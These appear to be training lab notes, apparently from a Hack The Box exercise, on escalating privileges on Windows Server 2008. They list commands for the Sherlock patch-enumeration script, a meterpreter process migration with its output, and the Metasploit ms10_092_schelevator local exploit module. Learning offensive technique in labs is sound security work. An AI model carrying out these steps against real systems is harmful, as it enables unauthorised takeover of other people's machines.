For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target.

Find local exploits with Sherlock
```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```

Obtain meterpreter shell and migrate to 64-bit process
```bash
meterpreter > getpid
meterpreter > ps

 2460  2656  explorer.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2632  2032  csrss.exe
 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2876  476   svchost.exe

meterpreter > migrate 2796
meterpreter > background
```

Exploit via metasploit and meterpreter shell
```bash
use exploit/windows/local/ms10_092_schelevator
```
